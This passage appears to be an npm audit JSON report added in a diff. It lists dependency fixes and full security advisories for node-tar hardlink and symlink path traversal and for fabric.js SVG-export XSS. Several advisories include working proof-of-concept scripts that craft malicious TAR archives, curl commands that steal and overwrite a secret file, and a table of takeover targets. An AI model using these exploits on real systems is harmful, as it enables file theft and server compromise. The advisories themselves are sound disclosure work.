@@ -1,0 +1,1678 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112659,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113300,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113375,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114200,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114302,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114680,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119441,
+          "path": "apps__api>firebase-admin>@google-cloud/firestore>google-gax>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120782,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123939,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123940,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123941,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123942,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1145647,
+          "path": "apps__desktop>fabric>canvas>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1242882,
+          "path": "apps__api>@raulbellosom/atlas-web-builder>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1247849,
+          "path": "apps__api>@raulbellosom/atlas-web-builder>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1247850,
+          "path": "apps__api>@raulbellosom/atlas-web-builder>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "dompurify",
+      "target": "3.5.0",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1243098,
+          "path": ".>prisma>@prisma/dev>@prisma/streams-local>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243101,
+          "path": ".>prisma>@prisma/dev>@prisma/streams-local>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243104,
+          "path": ".>prisma>@prisma/dev>@prisma/streams-local>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243107,
+          "path": ".>prisma>@prisma/dev>@prisma/streams-local>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "fast-uri",
+      "target": "3.1.9",
+      "depth": 6
+    },
+    {
+      "action": "review",
+      "module": "fabric",
+      "resolves": [
+        {
+          "id": 1113328,
+          "path": "apps__desktop>fabric",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123703,
+          "path": "apps__desktop>fabric",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "uuid",
+      "resolves": [
+        {
+          "id": 1119441,
+          "path": ".>exceljs>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "deepmerge-ts",
+      "resolves": [
+        {
+          "id": 1145093,
+          "path": ".>prisma>@prisma/config>deepmerge-ts",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "mysql2",
+      "resolves": [
+        {
+          "id": 1153173,
+          "path": ".>prisma>mysql2",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158532,
+          "path": ".>prisma>mysql2",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "csv-parse",
+      "resolves": [
+        {
+          "id": 1193670,
+          "path": "apps__api>csv-parse",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "image-size",
+      "resolves": [
+        {
+          "id": 1239765,
+          "path": "apps__desktop>pptxgenjs>image-size",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1239766,
+          "path": "apps__desktop>pptxgenjs>image-size",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "katex",
+      "resolves": [
+        {
+          "id": 1241206,
+          "path": "apps__desktop>@excalidraw/excalidraw>@excalidraw/mermaid-to-excalidraw>mermaid>katex",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@hono/node-server",
+      "resolves": [
+        {
+          "id": 1243661,
+          "path": ".>prisma>@prisma/dev>@hono/node-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243661,
+          "path": "apps__api>@hono/node-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "fast-xml-parser",
+      "resolves": [
+        {
+          "id": 1246029,
+          "path": "apps__api>fast-xml-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "effect",
+      "resolves": [
+        {
+          "id": 1248071,
+          "path": ".>prisma>@prisma/config>effect",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1112659": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24842\n- https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46\n- https://github.com/advisories/GHSA-34x7-hfp2-rc4v",
+      "created": "2026-01-28T16:35:31.000Z",
+      "id": 1112659,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+      "reported_by": null,
+      "title": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24842"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<7.5.7",
+      "github_advisory_id": "GHSA-34x7-hfp2-rc4v",
+      "recommendation": "Upgrade to version 7.5.7 or later",
+      "patched_versions": ">=7.5.7",
+      "updated": "2026-01-28T16:35:31.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-34x7-hfp2-rc4v"
+    },
+    "1113300": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23745\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
+      "created": "2026-01-16T21:16:20.000Z",
+      "id": 1113300,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "reported_by": null,
+      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23745"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.2",
+      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
+      "recommendation": "Upgrade to version 7.5.3 or later",
+      "patched_versions": ">=7.5.3",
+      "updated": "2026-02-18T23:43:47.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
+    },
+    "1113328": {
+      "findings": [
+        {
+          "version": "6.9.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fabricjs/fabric.js/security/advisories/GHSA-hfvx-25r5-qc3w\n- https://github.com/fabricjs/fabric.js/commit/7e1a122defd8feefe4eb7eaf0c180d7b0aeb6fee\n- https://github.com/fabricjs/fabric.js/releases/tag/v720\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27013\n- https://github.com/advisories/GHSA-hfvx-25r5-qc3w",
+      "created": "2026-02-18T22:44:58.000Z",
+      "id": 1113328,
+      "npm_advisory_id": null,
+      "overview": "fabric.js applies `escapeXml()` to text content during SVG export (`src/shapes/Text/TextSVGExportMixin.ts:186`) but fails to apply it to other user-controlled string values that are interpolated into SVG attribute markup. When attacker-controlled JSON is loaded via `loadFromJSON()` and later exported via `toSVG()`, the unescaped values break out of XML attributes and inject arbitrary SVG elements including event handlers.\n\n### Deserialization Path (no sanitization)\n\n`loadFromJSON()` (`src/canvas/StaticCanvas.ts:1229`) calls `enlivenObjects()` which calls `_fromObject()` (`src/shapes/Object/Object.ts:1902`). `_fromObject` passes all deserialized properties to the shape constructor via `new this(enlivedObjectOptions)`. The constructor ultimately calls `_setOptions()` (`src/CommonMethods.ts:9`) which iterates over every property and assigns it to the object via `this.set(prop, options[prop])`. There is no allowlist or sanitization - any property in the JSON, including `id`, is set verbatim on the fabric object.\n\n---\n\n### Finding 1: XSS via `id` Property Injection \n\nThe `id` property from deserialized JSON is interpolated directly into SVG attribute strings without escaping.\n\n**Vulnerable code (`src/shapes/Object/FabricObjectSVGExportMixin.ts`, line 89, `getSvgCommons()`):**\n```typescript\ngetSvgCommons(\n  this: FabricObjectSVGExportMixin & FabricObject & { id?: string },\n) {\n  return [\n    this.id ? `id=\"${this.id}\" ` : '',  // <-- unescaped, user-controlled\n    this.clipPath\n      ? `clip-path=\"url(#${...})\" `\n      : '',\n  ].join('');\n}\n```\n\nThis method is called in `_createBaseSVGMarkup()` (same file, line 178) which wraps every object's SVG output in a `<g>` element. Every fabric object type (Rect, Circle, Path, Text, Image, Group, etc.) inherits this mixin, so the `id` injection vector applies to all object types.\n\n**Contrast with text content, which IS escaped:**\n```typescript\n// src/shapes/Text/TextSVGExportMixin.ts:186\nreturn `<tspan ...>${escapeXml(char)}</tspan>`;\n```\n\nThe inconsistency shows that the intention was to prevent injection but was missed w attribute contexts.\n\n---\n\n### Finding 2: XSS via Image `src` / `xlink:href` Injection \n\nImage source URLs are interpolated raw into `xlink:href` in `_toSVG()`.\n\n**Vulnerable code (`src/shapes/Image.ts`, line 404, `_toSVG()`):**\n```typescript\nimageMarkup.push(\n  '\\t<image ',\n  'COMMON_PARTS',\n  `xlink:href=\"${this.getSvgSrc(true)}\" x=\"${x - this.cropX}\" y=\"${\n    y - this.cropY\n  }\" ...`  // <-- unescaped\n);\n```\n\n`getSvgSrc()` returns the image `src` property which is set from JSON during deserialization. An attacker can inject a `src` value that breaks out of the `xlink:href` attribute.\n\n---\n\n### Finding 3: XSS via Pattern `sourceToString()` \n\n**Vulnerable code (`src/Pattern/Pattern.ts`, line 181, `toSVG()`):**\n```typescript\n`<image x=\"0\" y=\"0\" ... xlink:href=\"${this.sourceToString()}\"></image>`\n// <-- unescaped, returns this.source.src for image sources\n```\n\nAdditionally, Pattern's constructor (`line 92–94`) runs `this.id = uid()` *before* `Object.assign(this, options)`, meaning a user-supplied `id` in the pattern JSON overwrites the auto-generated uid. The pattern `id` is then interpolated unescaped on line 180:\n```typescript\n`<pattern id=\"SVGID_${id}\" x=\"${patternOffsetX}\" ...>`\n```\n\n---\n\n### Finding 4: Gradient `id` Partial Injection (lower Severity)\n\n**Vulnerable code (`src/gradient/Gradient.ts`, line 212, `toSVG()`):**\n```typescript\n`id=\"SVGID_${this.id}\"`  // <-- unescaped\n```\n\nGradient's constructor (`line 125`) computes `id: id ? `${id}_${uid()}` : uid()`. If a user-supplied `id` is present in the gradient JSON, it is prepended to the auto-generated uid. The user-controlled portion is interpolated unescaped into the SVG. This is exploitable but the payload is constrained by the `_<uid>` suffix appended after it.\n\n---\n\n## Impact\n\nAny application that:\n1. Accepts user-supplied JSON (via `loadFromJSON()`, collaborative sharing, import features, CMS plugins), AND\n2. Renders the `toSVG()` output in a browser context (SVG preview, export download rendered in-page, email template, embed)\n\n...is vulnerable to stored XSS. An attacker can execute arbitrary JavaScript in the victim's browser session.\n\nReal-world attack scenarios:\n- Collaborative design tools (Canva-like apps) where users share canvas state as JSON\n- CMS or e-commerce platforms with fabric.js-based editors that store/render designs\n- Any export-to-SVG workflow where the SVG is later displayed in a browser\n\n---\n\n## Remediation\n\nUpdate to [fabric.js 7.2.0](https://github.com/fabricjs/fabric.js/releases/tag/v720) or newer version. \n\n---\n\n## Confirmed Affected Files\n\n| File | Issue | Method | Exploitable |\n|---|---|---|---|\n| `src/shapes/Object/FabricObjectSVGExportMixin.ts` | Unescaped `this.id` in attribute | `getSvgCommons()` | Yes - primary vector, all object types |\n| `src/shapes/Image.ts` | Unescaped `getSvgSrc()` in `xlink:href` | `_toSVG()` | Yes |\n| `src/Pattern/Pattern.ts` | Unescaped `sourceToString()` in `xlink:href`; unescaped `id` in attribute | `toSVG()` | Yes |\n| `src/gradient/Gradient.ts` | User-supplied `id` prefix interpolated unescaped | `toSVG()` | Yes (partial - uid suffix appended) |",
+      "reported_by": null,
+      "title": "Fabric.js Affected by Stored XSS via SVG Export",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27013"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fabric",
+      "vulnerable_versions": "<7.2.0",
+      "github_advisory_id": "GHSA-hfvx-25r5-qc3w",
+      "recommendation": "Upgrade to version 7.2.0 or later",
+      "patched_versions": ">=7.2.0",
+      "updated": "2026-02-19T21:57:27.000Z",
+      "cvss": {
+        "score": 7.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-hfvx-25r5-qc3w"
+    },
+    "1113375": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-83g3-92jg-28cx\n- https://github.com/isaacs/node-tar/commit/2cb1120bcefe28d7ecc719b41441ade59c52e384\n- https://github.com/isaacs/node-tar/commit/d18e4e1f846f4ddddc153b0f536a19c050e7499f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26960\n- https://github.com/advisories/GHSA-83g3-92jg-28cx",
+      "created": "2026-02-18T00:57:13.000Z",
+      "id": 1113375,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.\n\nThis enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).\n\nSeverity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.\n\n### Details\nThe bypass chain uses two symlinks plus one hardlink:\n\n1. `a/b/c/up -> ../..`\n2. `a/b/escape -> c/up/../..`\n3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`\n\nWhy this works:\n\n- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.\n  - See `STRIPABSOLUTEPATH` logic in:\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`\n\n- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`\n\n- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`\n\nAs a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.\n\n### PoC\n[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)\nEnvironment used for validation:\n\n- Node: `v25.4.0`\n- tar: `7.5.7`\n- OS: macOS Darwin 25.2.0\n- Extract options: defaults (`tar.extract({ file, cwd })`)\n\nSteps:\n\n1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.\n\n2. Run:\n\n```bash\nTAR_MODULE=\"$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)\" node hardlink.js\n```\n\n3. Expected vulnerable output (key lines):\n\n```text\nsame_inode=true\nread_ok=true\nwrite_ok=true\nresult=VULNERABLE\n```\n\nInterpretation:\n\n- `same_inode=true`: extracted `exfil` and external secret are the same file object.\n- `read_ok=true`: reading `exfil` leaks external content.\n- `write_ok=true`: writing `exfil` modifies external file.\n\n### Impact\nVulnerability type:\n\n- Arbitrary file read/write via archive extraction path confusion and link resolution.\n\nWho is impacted:\n\n- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.\n- Impact scope is the privileges of the extracting process 